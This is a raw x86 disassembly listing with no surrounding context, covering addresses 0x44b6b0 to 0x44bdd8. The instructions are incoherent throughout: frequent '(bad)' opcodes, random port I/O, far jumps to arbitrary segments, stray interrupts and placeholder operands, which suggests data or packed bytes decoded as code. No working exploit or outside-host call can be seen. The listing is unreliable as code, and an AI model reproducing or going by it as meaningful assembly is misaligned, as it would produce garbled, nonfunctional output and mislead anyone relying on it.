  44b6b0:	sub    esi,DWORD PTR [eax-0x4a]
  44b6b3:	and    cl,cl
  44b6b5:	inc    bp
  44b6b7:	pop    ecx
  44b6b8:	stos   BYTE PTR es:[edi],al
  44b6b9:	pusha  
  44b6ba:	or     eax,0x636ec842
  44b6bf:	push   0xffffffa1
  44b6c1:	call   0xdaa386ac
  44b6c6:	mov    DWORD PTR [ecx],esp
  44b6c8:	mov    ecx,esi
  44b6ca:	push   edx
  44b6cb:	xchg   edi,eax
  44b6cc:	and    DWORD PTR [eax-0x18],0xa43e0e3
  44b6d3:	push   0x3de7d8bb
  44b6d8:	or     cl,bl
  44b6da:	xor    BYTE PTR [eax-0x63],dl
  44b6dd:	add    al,0x85
  44b6df:	in     eax,0x7e
  44b6e1:	es jmp 0x44b684
  44b6e4:	sbb    al,0x8d
  44b6e6:	in     eax,dx
  44b6e7:	cmp    esi,DWORD PTR [ebp+0x5eb9b430]
  44b6ed:	(bad)  
  44b6ee:	popa   
  44b6ef:	cwde   
  44b6f0:	push   ebx
  44b6f1:	inc    esi
  44b6f2:	idiv   BYTE PTR [ebp-0x9]
  44b6f5:	pop    edi
  44b6f6:	xor    DWORD PTR [ecx+eiz*1-0x29],esi
  44b6fa:	test   BYTE PTR [ecx],ah
  44b6fc:	pop    ebx
  44b6fd:	xor    DWORD PTR [eax+0x3fd95ebe],esi
  44b703:	sub    edx,DWORD PTR [eax-0x4913f054]
  44b709:	mov    ah,0x9f
  44b70b:	mov    eax,ds:0x2081d03f
  44b710:	rol    BYTE PTR [edi],0xcc
  44b713:	(bad)  
  44b715:	sbb    ebx,DWORD PTR [ecx+0x49]
  44b718:	pop    ebp
  44b719:	jno    0x44b709
  44b71b:	jne    0x44b6a0
  44b71d:	int    0xd2
  44b71f:	inc    ebp
  44b720:	adc    ecx,DWORD PTR [esi+0x3d3ba89c]
  44b726:	shl    BYTE PTR [esi+esi*2],0x0
  44b72a:	and    al,0xbb
  44b72c:	push   ebp
  44b72d:	jae    0x44b72a
  44b72f:	mov    ah,0x62
  44b731:	add    BYTE PTR [ebx+0x6f],dl
  44b734:	fs aas 
  44b736:	and    ch,bh
  44b738:	xor    BYTE PTR [edi-0x4c21e11e],0x75
  44b73f:	dec    esp
  44b740:	xor    eax,0xf8b60150
  44b745:	imul   BYTE PTR [esi-0x7a]
  44b748:	or     cl,BYTE PTR [ebp-0x34]
  44b74b:	mov    BYTE PTR [eax-0x44],bh
  44b74e:	jecxz  0x44b6f0
  44b750:	test   eax,0x2742448a
  44b755:	mov    edx,0xa1ed750a
  44b75a:	lock sub eax,ebp
  44b75d:	jge    0x44b72b
  44b75f:	xchg   esp,eax
  44b760:	pop    ebp
  44b761:	repnz pushf 
  44b763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b764:	aad    0x5a
  44b766:	jmp    0x44b6fb
  44b768:	cs adc eax,0x4ffa02e8
  44b76e:	(bad)  
  44b770:	dec    esi
  44b771:	rcr    BYTE PTR [esi+0x5e1c56c3],1
  44b777:	mov    ebp,DWORD PTR [esi]
  44b779:	imul   ebp,ebp,0xb418e5f2
  44b77f:	mov    BYTE PTR [edx-0x41ff04a9],ah
  44b785:	adc    al,0x8d
  44b787:	pushf  
  44b788:	jle    0x44b782
  44b78a:	sub    DWORD PTR [edx+edi*2],ebx
  44b78d:	pop    esp
  44b78e:	adc    cl,dh
  44b790:	and    BYTE PTR [ecx],ah
  44b792:	or     eax,0xfe007519
  44b797:	dec    eax
  44b798:	lods   eax,DWORD PTR ds:[esi]
  44b799:	pop    ebp
  44b79a:	cli    
  44b79b:	and    al,0xf4
  44b79d:	jg     0x44b7d5
  44b79f:	push   0x7e
  44b7a1:	dec    esi
  44b7a2:	pop    esi
  44b7a3:	ret    
  44b7a4:	es pop esi
  44b7a6:	pop    ds
  44b7a7:	mov    fs,WORD PTR [esi-0x40]
  44b7aa:	pop    ebp
  44b7ab:	shl    edx,0x65
  44b7ae:	es fisubr WORD PTR ss:0x78e6a2ab
  44b7b6:	jge    0x44b779
  44b7b8:	dec    eax
  44b7b9:	and    DWORD PTR [eax],ecx
  44b7bb:	and    ebp,DWORD PTR [eax-0x19]
  44b7be:	or     DWORD PTR [esi+0x7268b5d],esi
  44b7c4:	stc    
  44b7c5:	shr    al,cl
  44b7c7:	iret   
  44b7c8:	adc    al,0x7e
  44b7ca:	test   BYTE PTR [ebx],0x0
  44b7cd:	(bad)  
  44b7ce:	in     al,dx
  44b7cf:	and    al,0x4
  44b7d1:	mov    cl,0x6d
  44b7d3:	and    al,0xda
  44b7d5:	lock sbb dl,dh
  44b7d8:	out    0x44,al
  44b7da:	xchg   DWORD PTR [esi-0x40],eax
  44b7dd:	or     al,BYTE PTR [ebp+ecx*4-0x61]
  44b7e1:	sbb    DWORD PTR [esi-0x6],eax
  44b7e4:	push   es
  44b7e5:	push   ecx
  44b7e6:	xor    DWORD PTR [edx+0x848722e],0x6f763e0f
  44b7f0:	pop    ebp
  44b7f1:	retf   0xf81
  44b7f4:	(bad)  
  44b7f5:	std    
  44b7f6:	mov    esp,DWORD PTR [ebp-0x29]
  44b7f9:	fwait
  44b7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b7fb:	pop    es
  44b7fc:	pop    esi
  44b7fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b7fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b7ff:	pop    esi
  44b800:	mov    ds:0x7d499ea1,eax
  44b805:	mov    eax,0xf59ead3a
  44b80a:	out    dx,eax
  44b80b:	gs mov dl,0xeb
  44b80e:	addr16 pop edx
  44b810:	pushf  
  44b811:	push   eax
  44b812:	push   edi
  44b813:	leave  
  44b814:	or     ecx,DWORD PTR [ebx]
  44b816:	fsub   QWORD PTR [eax]
  44b818:	dec    edx
  44b819:	movsx  ebx,BYTE PTR [eax+0x426eb5f2]
  44b820:	vpsubw ymm6,ymm1,YMMWORD PTR [ebx]
  44b824:	in     eax,dx
  44b825:	lock out 0x59,eax
  44b828:	mov    eax,0xdf70299d
  44b82d:	mov    edx,0xadc34152
  44b832:	pusha  
  44b833:	jno    0x44b7fe
  44b835:	mov    al,0x62
  44b837:	push   0xffffff82
  44b839:	out    0x68,eax
  44b83b:	imul   eax,DWORD PTR [edi+0x631fa262],0xdb159294
  44b845:	nop
  44b846:	xor    dl,BYTE PTR [edx+0x65da2b74]
  44b84c:	mov    ebx,0x6720f471
  44b851:	and    eax,0xf9d460c1
  44b856:	xchg   ebp,eax
  44b857:	lahf   
  44b858:	fsubp  st(7),st
  44b85a:	xor    al,0xa1
  44b85c:	mov    al,0x9c
  44b85e:	sub    BYTE PTR [edi-0x3f],ch
  44b861:	mov    cl,0x64
  44b863:	jo     0x44b869
  44b865:	ret    0x2760
  44b868:	int3   
  44b869:	mov    ecx,0x83e0b8f6
  44b86e:	outs   dx,BYTE PTR ds:[esi]
  44b86f:	out    dx,al
  44b870:	lea    ebx,[eax]
  44b872:	retf   
  44b873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b874:	std    
  44b875:	push   edi
  44b876:	aaa    
  44b877:	or     al,0xfc
  44b879:	scas   eax,DWORD PTR es:[edi]
  44b87a:	das    
  44b87b:	push   edx
  44b87c:	test   bl,0xfe
  44b87f:	push   edx
  44b880:	(bad)  [edx-0x6b1131f]
  44b886:	ret    0xad7
  44b889:	movntq (bad),mm5
  44b88a:	out    0xec,eax
  44b88c:	les    ebx,FWORD PTR [ebp-0x72]
  44b88f:	cmp    al,0xc4
  44b891:	pop    esi
  44b892:	xchg   esi,eax
  44b893:	mov    eax,ds:0x649def60
  44b898:	fwait
  44b899:	mov    ds:0xa4627e8b,al
  44b89e:	pop    edi
  44b89f:	adc    DWORD PTR [edx-0x50],edi
  44b8a2:	ins    DWORD PTR es:[edi],dx
  44b8a3:	add    edx,DWORD PTR [edx+0x5d48d758]
  44b8a9:	cmp    bh,BYTE PTR ds:0x76e16a6c
  44b8af:	out    dx,al
  44b8b0:	sbb    DWORD PTR [ecx+0x2b],edx
  44b8b3:	sbb    ebx,DWORD PTR [ebx]
  44b8b5:	sub    DWORD PTR [esi+0x68],ebp
  44b8b8:	fldenv [esi*4-0x2a2f5971]
  44b8bf:	mov    al,ds:0x6f42837e
  44b8c4:	pop    es
  44b8c5:	aaa    
  44b8c6:	pop    esi
  44b8c7:	sbb    ch,BYTE PTR [eax+0x35]
  44b8ca:	mov    DWORD PTR [edi+ebx*2],0xcfe0b9e1
  44b8d1:	retf   0xf677
  44b8d4:	inc    esi
  44b8d5:	jmp    0xbac72205
  44b8da:	imul   BYTE PTR [eax+0x73]
  44b8dd:	fmul   QWORD PTR [esi-0x77]
  44b8e0:	in     al,dx
  44b8e1:	scas   eax,DWORD PTR es:[edi]
  44b8e2:	rcl    DWORD PTR [ebx-0x66],cl
  44b8e5:	pop    eax
  44b8e6:	rcl    BYTE PTR [eax+0x59],0x14
  44b8ea:	sub    BYTE PTR [esi+ebx*8-0x794e2714],ah
  44b8f1:	out    0xe1,eax
  44b8f3:	mov    bh,0x78
  44b8f5:	in     eax,0x20
  44b8f7:	and    DWORD PTR [eax],edi
  44b8f9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  44b8fb:	scas   eax,DWORD PTR es:[edi]
  44b8fc:	ss dec ecx
  44b8fe:	mov    eax,ds:0x7d9e66ea
  44b903:	shr    esi,1
  44b905:	fdivr  QWORD PTR [edi]
  44b907:	test   DWORD PTR [edx+0x56],esi
  44b90a:	mov    ch,0xe7
  44b90c:	sbb    al,0x10
  44b90e:	loop   0x44b987
  44b910:	ffree  st(4)
  44b912:	mov    ?,WORD PTR [edx+0x6936e4b1]
  44b918:	into   
  44b919:	sbb    BYTE PTR [ebx-0xe],al
  44b91c:	push   esi
  44b91d:	sub    BYTE PTR [ecx-0x7f],al
  44b920:	jmp    0x658c:0x3992889
  44b927:	loope  0x44b8cc
  44b929:	adc    ah,cl
  44b92b:	pop    esp
  44b92c:	data16 arpl WORD PTR [esi],bp
  44b92f:	and    bl,dh
  44b931:	repz rol ch,cl
  44b934:	cs push ecx
  44b936:	fsubr  st,st(5)
  44b938:	inc    ebx
  44b939:	dec    ebp
  44b93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b93b:	in     eax,dx
  44b93c:	sub    al,0xd9
  44b93e:	sub    DWORD PTR [eax],edi
  44b940:	jmp    0x44b99c
  44b942:	jle    0x44b972
  44b944:	in     al,dx
  44b945:	dec    eax
  44b946:	or     BYTE PTR [edx-0x40],ah
  44b949:	dec    esp
  44b94a:	lock pusha 
  44b94c:	mov    bl,0x20
  44b94e:	dec    edx
  44b94f:	frstor [esi]
  44b951:	sbb    al,0x5
  44b953:	adc    al,0xf6
  44b955:	sub    dh,al
  44b957:	ds mov al,0x5e
  44b95a:	sahf   
  44b95b:	and    al,bl
  44b95d:	xchg   esi,eax
  44b95e:	test   BYTE PTR [ebp-0x1b],bl
  44b961:	mov    dh,0xdb
  44b963:	dec    esi
  44b964:	fdiv   QWORD PTR [ebx*8-0xad40697]
  44b96b:	cli    
  44b96c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  44b96e:	ret    0xd15
  44b971:	loope  0x44b962
  44b973:	lods   eax,DWORD PTR ds:[esi]
  44b974:	mov    ah,0xa7
  44b976:	mov    WORD PTR [edx],?
  44b978:	cld    
  44b979:	inc    ecx
  44b97a:	cs cdq 
  44b97c:	in     eax,dx
  44b97d:	jbe    0x44b9e3
  44b97f:	aaa    
  44b980:	inc    esi
  44b981:	daa    
  44b982:	sbb    ah,BYTE PTR [ecx]
  44b984:	and    esp,DWORD PTR ds:0x99a8f702
  44b98b:	repz inc esp
  44b98d:	mov    cl,0x2c
  44b98f:	out    dx,al
  44b990:	into   
  44b991:	enter  0x58fa,0xb1
  44b995:	out    0x9e,eax
  44b997:	stos   BYTE PTR es:[edi],al
  44b998:	add    al,0x5c
  44b99a:	test   ah,dh
  44b99c:	add    DWORD PTR [edi],esi
  44b99e:	test   BYTE PTR [ecx],cl
  44b9a0:	mov    al,0xff
  44b9a2:	scas   al,BYTE PTR es:[edi]
  44b9a3:	push   0x60eaef11
  44b9a8:	call   0xd2ac:0xdd80e5a2
  44b9af:	dec    eax
  44b9b0:	lods   eax,DWORD PTR ds:[esi]
  44b9b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b9b2:	cmc    
  44b9b3:	icebp  
  44b9b4:	mov    WORD PTR [edi-0x36],ds
  44b9b7:	push   ecx
  44b9b8:	pop    ebp
  44b9b9:	or     DWORD PTR [edi],ebp
  44b9bb:	mov    ds:0xacee9624,al
  44b9c0:	mov    cl,0xa9
  44b9c2:	fs inc edi
  44b9c4:	cmp    bh,BYTE PTR [edi]
  44b9c6:	add    esp,DWORD PTR [ebp-0x3cf7cb9a]
  44b9cc:	jbe    0x44ba19
  44b9ce:	xchg   edi,eax
  44b9cf:	out    dx,eax
  44b9d0:	cmp    ch,bl
  44b9d2:	push   ss
  44b9d3:	lods   eax,DWORD PTR ds:[esi]
  44b9d4:	loop   0x44b9f5
  44b9d6:	fcom   DWORD PTR [eax-0x10]
  44b9d9:	jo     0x44ba41
  44b9db:	sub    eax,0x94c7d742
  44b9e0:	push   edx
  44b9e1:	xchg   edx,eax
  44b9e2:	ins    DWORD PTR es:[edi],dx
  44b9e3:	imul   esp,DWORD PTR [esi+edx*1],0xffffffb5
  44b9e7:	mov    cl,0x24
  44b9e9:	and    eax,0xe6ac484e
  44b9ee:	fsub   QWORD PTR [edx+ebx*2-0x18b25a17]
  44b9f5:	nop
  44b9f6:	ins    DWORD PTR es:[edi],dx
  44b9f7:	jb     0x44ba01
  44b9f9:	xchg   DWORD PTR [ebp-0x1a5810af],eax
  44b9ff:	cs cmp DWORD PTR gs:[edx],0xbca517d5
  44ba07:	loopne 0x44b9aa
  44ba09:	push   ss
  44ba0a:	leave  
  44ba0b:	pop    edx
  44ba0c:	data16 data16 lods al,BYTE PTR ds:[esi]
  44ba0f:	and    al,al
  44ba11:	add    esi,edi
  44ba13:	loopne 0x44ba6f
  44ba15:	cmp    DWORD PTR [esi],ecx
  44ba17:	xor    esi,ecx
  44ba19:	js     0x44b9f8
  44ba1b:	mov    esp,0x20e41876
  44ba20:	(bad)  
  44ba21:	jmp    0x26ab6906
  44ba26:	leave  
  44ba27:	stos   DWORD PTR es:[edi],eax
  44ba28:	push   esi
  44ba29:	cs jmp 0xeb6d6e3f
  44ba2f:	sbb    al,0x9f
  44ba31:	out    dx,eax
  44ba32:	xchg   esi,eax
  44ba33:	mov    BYTE PTR [ebx+0x26],ch
  44ba36:	push   cs
  44ba37:	cmp    ebp,edx
  44ba39:	xor    dl,bl
  44ba3b:	adc    DWORD PTR [edx-0x75],ebx
  44ba3e:	jle    0x44babf
  44ba40:	pop    edx
  44ba41:	jmp    0x44b9fa
  44ba43:	xor    DWORD PTR [ebp-0x7f02d364],ebx
  44ba49:	pop    ds
  44ba4a:	out    0xfd,al
  44ba4c:	in     eax,0xaf
  44ba4e:	loope  0x44ba9a
  44ba50:	scas   al,BYTE PTR es:[edi]
  44ba51:	mov    al,0xcd
  44ba53:	push   edx
  44ba54:	shr    BYTE PTR [eax],1
  44ba56:	push   0x361a2ded
  44ba5b:	cdq    
  44ba5c:	cmp    ch,ah
  44ba5e:	scas   al,BYTE PTR es:[edi]
  44ba5f:	and    ah,dl
  44ba61:	or     bl,bh
  44ba63:	push   0xffffffb9
  44ba65:	into   
  44ba66:	jmp    0xe931:0xfa34c7c0
  44ba6d:	outs   dx,BYTE PTR ds:[esi]
  44ba6e:	data16 mov ch,0xf2
  44ba71:	mov    eax,0x17349d6c
  44ba76:	jmp    0x5ae0:0xdeebe2a2
  44ba7d:	out    0x67,eax
  44ba7f:	fsqrt  
  44ba81:	fadd   st,st(6)
  44ba83:	or     al,0x3c
  44ba85:	test   al,0xf6
  44ba87:	cwde   
  44ba88:	sbb    al,0x7e
  44ba8a:	(bad)  [ebx+ebp*4-0x36cf59e2]
  44ba91:	nop
  44ba92:	sub    eax,0xd63d0806
  44ba97:	not    BYTE PTR ds:0xee24de87
  44ba9d:	mov    esp,esi
  44ba9f:	enter  0xd872,0xb4
  44baa3:	pop    ebx
  44baa4:	pushw  ds
  44baa6:	xor    eax,0xf69a1d9d
  44baab:	mov    bh,0xe
  44baad:	out    0x6e,eax
  44baaf:	or     eax,0x19fc0c34
  44bab4:	mov    esi,0xe6a2f804
  44bab9:	cmp    ecx,DWORD PTR [esi]
  44babb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44babc:	add    esi,DWORD PTR [esi+0x4b]
  44babf:	xor    esp,DWORD PTR [esi]
  44bac1:	mov    al,0xf2
  44bac3:	in     al,0xde
  44bac5:	sub    esi,eax
  44bac7:	lods   eax,DWORD PTR ds:[esi]
  44bac8:	push   edx
  44bac9:	jnp    0x44baa7
  44bacb:	pushf  
  44bacc:	pop    edx
  44bacd:	mov    eax,ds:0x253e5e3
  44bad2:	pushf  
  44bad3:	lahf   
  44bad4:	adc    DWORD PTR [esi],eax
  44bad6:	adc    al,0xef
  44bad8:	repnz or esp,edi
  44badb:	aas    
  44badc:	pop    edx
  44badd:	sub    ecx,edi
  44badf:	cs sahf 
  44bae1:	lods   al,BYTE PTR ds:[esi]
  44bae2:	(bad)  
  44bae3:	out    dx,al
  44bae4:	jge    0x44baee
  44bae6:	pop    edx
  44bae7:	stc    
  44bae8:	cli    
  44bae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44baea:	loopne 0x44bad0
  44baec:	fiadd  WORD PTR [ebp+0x568907ea]
  44baf2:	scas   eax,DWORD PTR es:[edi]
  44baf3:	ins    BYTE PTR es:[edi],dx
  44baf4:	int    0x1b
  44baf6:	or     al,0xe2
  44baf8:	or     ah,BYTE PTR [ecx]
  44bafa:	push   0xffffffb6
  44bafc:	xor    al,0xe6
  44bafe:	pop    eax
  44baff:	and    al,bl
  44bb01:	push   cs
  44bb02:	out    dx,eax
  44bb03:	inc    esp
  44bb04:	ror    DWORD PTR [eax],1
  44bb06:	jmp    0x44bb49
  44bb08:	adc    eax,DWORD PTR [edi+0x4e]
  44bb0b:	dec    eax
  44bb0c:	sti    
  44bb0d:	jnp    0x44bb84
  44bb0f:	mov    cl,0x5d
  44bb11:	sub    eax,0x2b761524
  44bb16:	push   0xfffffff5
  44bb18:	ins    DWORD PTR es:[edi],dx
  44bb19:	xor    dl,0x37
  44bb1c:	push   cs
  44bb1d:	das    
  44bb1e:	jbe    0x44bb83
  44bb20:	xor    al,0xc3
  44bb22:	jb     0x44bab1
  44bb24:	retf   0xadce
  44bb27:	pop    ebx
  44bb28:	out    dx,al
  44bb29:	xor    edx,ebx
  44bb2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bb2c:	sub    cl,ah
  44bb2e:	mov    esi,DWORD PTR [edi]
  44bb30:	out    0xec,al
  44bb32:	mov    eax,0x33995a30
  44bb37:	outs   dx,DWORD PTR ds:[esi]
  44bb38:	out    dx,eax
  44bb39:	mov    cl,0x7c
  44bb3b:	in     eax,dx
  44bb3c:	sbb    BYTE PTR [esi-0x21],0x4d
  44bb40:	pop    ecx
  44bb41:	sub    DWORD PTR [edx-0x1770e8e8],ebp
  44bb47:	out    0xa2,eax
  44bb49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bb4a:	sub    DWORD PTR [edx+0x33],esi
  44bb4d:	cdq    
  44bb4e:	or     al,0xa5
  44bb50:	sub    bl,BYTE PTR [esi+0x10d67983]
  44bb56:	repnz push 0xffffffd7
  44bb59:	bound  edi,QWORD PTR [ecx-0x3c3e2f6f]
  44bb5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bb60:	pop    edx
  44bb61:	std    
  44bb62:	int3   
  44bb63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bb64:	(bad)  
  44bb65:	aaa    
  44bb66:	cld    
  44bb67:	cdq    
  44bb68:	into   
  44bb69:	imul   ebp,eax,0x1c
  44bb6c:	in     eax,dx
  44bb6d:	test   al,0x16
  44bb6f:	xor    esi,eax
  44bb71:	fmul   QWORD PTR [edx]
  44bb73:	xor    al,0xee
  44bb75:	push   esp
  44bb76:	outs   dx,DWORD PTR ds:[esi]
  44bb77:	lock (bad) 
  44bb79:	loopne 0x44bba5
  44bb7b:	bound  esp,QWORD PTR [eax+0x1694b9a5]
  44bb81:	or     ah,bh
  44bb83:	and    al,cl
  44bb85:	pusha  
  44bb86:	mov    eax,ds:0x35d9ac29
  44bb8b:	sub    eax,ecx
  44bb8d:	push   ebp
  44bb8e:	pop    edi
  44bb8f:	pop    esi
  44bb90:	(bad)
  44bb93:	aad    0xd6
  44bb95:	xor    eax,DWORD PTR [esi]
  44bb97:	sbb    esp,ebx
  44bb99:	setbe  dh
  44bb9c:	sub    al,0x98
  44bb9e:	cs stc 
  44bba0:	pop    ebp
  44bba1:	rol    DWORD PTR [edx-0x15eac1fb],0xc1
  44bba8:	mov    esi,0xa7c2c9ac
  44bbad:	js     0x44bb83
  44bbaf:	mov    eax,ds:0x509712f6
  44bbb4:	outs   dx,BYTE PTR ds:[esi]
  44bbb5:	pop    ss
  44bbb6:	call   0x4e36:0xb37094ed
  44bbbd:	bt     DWORD PTR [edx+0x2f200a76],eax
  44bbc4:	jp     0x44bc1d
  44bbc6:	les    ebp,FWORD PTR [edi]
  44bbc8:	jl     0x44bc28
  44bbca:	fisub  WORD PTR [eax+0x7b]
  44bbcd:	mov    ebp,0xb1666716
  44bbd2:	mov    eax,ds:0xc29df921
  44bbd7:	or     DWORD PTR [esi+0x25],0x49
  44bbdb:	icebp  
  44bbdc:	sub    cl,BYTE PTR ds:0xe132d615
  44bbe2:	mov    edx,0xa5e5a0a0
  44bbe7:	cmp    eax,0x708ae990
  44bbec:	dec    edi
  44bbed:	xchg   edx,eax
  44bbee:	mov    ?,ebp
  44bbf0:	push   0x5b297da1
  44bbf5:	in     eax,0x71
  44bbf7:	int3   
  44bbf8:	cdq    
  44bbf9:	bnd jle 0x44bc4d
  44bbfc:	mov    ebp,0x7e5ee807
  44bc01:	or     edi,edx
  44bc03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bc04:	out    0xa,al
  44bc06:	add    DWORD PTR [ecx+0x4f],eax
  44bc09:	pop    edi
  44bc0a:	out    0xe8,eax
  44bc0c:	adc    al,0x53
  44bc0e:	sub    bl,ch
  44bc10:	int    0x50
  44bc12:	lods   al,BYTE PTR ds:[esi]
  44bc13:	gs pop edi
  44bc15:	sbb    eax,0x961b91fe
  44bc1a:	sbb    eax,0x341265dd
  44bc1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bc20:	adc    BYTE PTR [ecx+0xd],dl
  44bc23:	aam    0x9b
  44bc25:	push   eax
  44bc26:	mov    ebp,0x2f064e63
  44bc2b:	fwait
  44bc2c:	ret    
  44bc2d:	in     eax,0x9f
  44bc2f:	adc    DWORD PTR [ecx+0x40],ebx
  44bc32:	retf   
  44bc33:	int3   
  44bc34:	dec    eax
  44bc35:	loope  0x44bc9f
  44bc37:	push   0x51fc5e9f
  44bc3c:	lods   eax,DWORD PTR ds:[esi]
  44bc3d:	ret    
  44bc3e:	out    0xa0,eax
  44bc40:	mov    esi,0xca2fad2b
  44bc45:	cmp    ebx,esi
  44bc47:	pop    esp
  44bc48:	into   
  44bc49:	sbb    ch,cl
  44bc4b:	fs dec edi
  44bc4d:	fdivr  QWORD PTR [esi+0x11307ea6]
  44bc53:	jns    0x44bc9a
  44bc55:	or     bh,ah
  44bc57:	and    al,ch
  44bc59:	ret    0x18ba
  44bc5c:	mov    al,ds:0xf2e0c2fc
  44bc61:	pop    ss
  44bc62:	sub    BYTE PTR [ebp-0x4a],ah
  44bc65:	bound  ebp,QWORD PTR ds:0x9e9dd613
  44bc6b:	sbb    DWORD PTR [ecx],ebx
  44bc6d:	lahf   
  44bc6e:	jae    0x44bc01
  44bc70:	cmp    eax,0x218a9f16
  44bc75:	jecxz  0x44bc74
  44bc77:	sub    esp,DWORD PTR [eax+0xe]
  44bc7a:	dec    ebx
  44bc7b:	call   0xe3e8c5ae
  44bc80:	add    dh,BYTE PTR [eax]
  44bc82:	fcmovnbe st,st(2)
  44bc84:	jmp    0x3498:0x5e5d96e0
  44bc8b:	dec    ecx
  44bc8c:	mov    ?,edx
  44bc8e:	xchg   BYTE PTR [eax-0x5c],dh
  44bc91:	jl     0x44bc1f
  44bc93:	jmp    0x49da:0xfc77572a
  44bc9a:	jnp    0x44bc3f
  44bc9c:	sbb    ch,al
  44bc9e:	jne    0x44bc78
  44bca0:	and    cl,bl
  44bca2:	ss push ecx
  44bca4:	ret    
  44bca5:	sub    DWORD PTR [ecx+0x6e10faaa],esi
  44bcab:	inc    ecx
  44bcac:	inc    ebp
  44bcad:	or     eax,ebp
  44bcaf:	and    al,0xd9
  44bcb1:	std    
  44bcb2:	ret    
  44bcb3:	fwait
  44bcb4:	data16 loope 0x44bce0
  44bcb7:	adc    DWORD PTR [esi+0x317a1f6e],ebx
  44bcbd:	jg     0x44bc6d
  44bcbf:	sub    eax,0xe7b21d5a
  44bcc4:	sbb    DWORD PTR gs:[esi-0x66dee6d7],ebp
  44bccb:	ficomp WORD PTR [esi]
  44bccd:	in     eax,0x83
  44bccf:	shl    DWORD PTR [edi-0x96b2409],1
  44bcd5:	and    eax,0x60c82169
  44bcda:	cmp    eax,0x3ebfa35f
  44bcdf:	ds retf 
  44bce1:	call   0x2301688c
  44bce6:	cmc    
  44bce7:	xlat   BYTE PTR gs:[ebx]
  44bce9:	das    
  44bcea:	ins    BYTE PTR es:[edi],dx
  44bceb:	sub    eax,0xa4ad32d6
  44bcf0:	int    0x40
  44bcf2:	sub    ch,BYTE PTR [ecx]
  44bcf4:	inc    edx
  44bcf5:	fnstcw WORD PTR [eax-0x4f219ab0]
  44bcfb:	and    cl,BYTE PTR [esi]
  44bcfd:	loope  0x44bcb4
  44bcff:	add    BYTE PTR [edx],dl
  44bd01:	daa    
  44bd02:	scas   al,BYTE PTR es:[edi]
  44bd03:	sub    dl,ch
  44bd05:	js     0x44bcd9
  44bd07:	mov    eax,0x8dc87ce2
  44bd0c:	mov    dh,BYTE PTR [esi-0x2a]
  44bd0f:	mov    ecx,0x95eae234
  44bd14:	xor    DWORD PTR [ecx+0x1e0eb00c],esi
  44bd1a:	out    0x28,al
  44bd1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bd1d:	push   edi
  44bd1e:	cwde   
  44bd1f:	cdq    
  44bd20:	push   ds
  44bd21:	icebp  
  44bd22:	push   es
  44bd23:	ficom  DWORD PTR [ebp-0x37]
  44bd26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bd27:	adc    ecx,esp
  44bd29:	push   esi
  44bd2a:	fucomi st,st(1)
  44bd2c:	repnz fldcw WORD PTR [esi-0x2a]
  44bd30:	pop    edi
  44bd31:	lea    edi,ds:0x8fd08053
  44bd37:	or     dh,BYTE PTR [ebx+0x7a]
  44bd3a:	cmp    edi,DWORD PTR [esi+ebx*8]
  44bd3d:	push   edi
  44bd3e:	xor    al,0x42
  44bd40:	pop    ebp
  44bd41:	pop    ebp
  44bd42:	xor    eax,DWORD PTR [ecx+esi*8-0x2f]
  44bd46:	inc    BYTE PTR [edx-0xe]
  44bd49:	fisubr WORD PTR [eax]
  44bd4b:	or     eax,0x9172d6ef
  44bd50:	in     eax,0xe2
  44bd52:	jl     0x44bcf6
  44bd54:	retf   0x73e6
  44bd57:	retf   
  44bd58:	sbb    eax,0xc0dd6cd5
  44bd5d:	pop    eax
  44bd5e:	jb     0x44bd12
  44bd60:	call   0x943b641b
  44bd65:	fdiv   st,st(6)
  44bd67:	add    al,0x89
  44bd69:	pop    eax
  44bd6a:	mov    eax,0x2913665d
  44bd6f:	popf   
  44bd70:	daa    
  44bd71:	mov    eax,ds:0x1ade2e55
  44bd76:	xchg   edi,eax
  44bd77:	cmp    dl,dh
  44bd79:	icebp  
  44bd7a:	jmp    0x44bd54
  44bd7c:	dec    esp
  44bd7d:	push   eax
  44bd7e:	test   BYTE PTR ds:0x20da7068,ch
  44bd84:	or     edx,ebx
  44bd86:	inc    edx
  44bd87:	dec    ebx
  44bd88:	inc    eax
  44bd89:	sar    DWORD PTR [ebx],0x33
  44bd8c:	(bad)  
  44bd8d:	pusha  
  44bd8e:	cmp    BYTE PTR [edx],dh
  44bd90:	scas   al,BYTE PTR es:[edi]
  44bd91:	in     al,dx
  44bd92:	add    BYTE PTR [eax-0x38],ah
  44bd95:	fist   DWORD PTR [esi]
  44bd97:	sbb    eax,0x5506d2f2
  44bd9c:	scas   eax,DWORD PTR es:[edi]
  44bd9d:	retf   
  44bd9e:	div    BYTE PTR [edx]
  44bda0:	iret   
  44bda1:	test   al,0x3d
  44bda3:	vpmullw xmm0,xmm7,XMMWORD PTR [esi+0x6cddbba0]
  44bdab:	push   0x18f62ad4
  44bdb0:	in     eax,0xe4
  44bdb2:	jb     0x44bdd9
  44bdb4:	rcl    cl,cl
  44bdb6:	pop    esi
  44bdb7:	sbb    eax,0xed4920de
  44bdbc:	adc    eax,0xe6e596be
  44bdc1:	sub    eax,0x20f04dae
  44bdc6:	inc    esp
  44bdc7:	repnz push ds
  44bdc9:	mov    ecx,edx
  44bdcb:	loopne 0x44bd5d
  44bdcd:	cmp    DWORD PTR [esi+0x2720fe59],ebp
  44bdd3:	push   cs
  44bdd4:	es in  eax,0x6e
  44bdd7:	push   ecx
  44bdd8:	fdivrp st(5),st
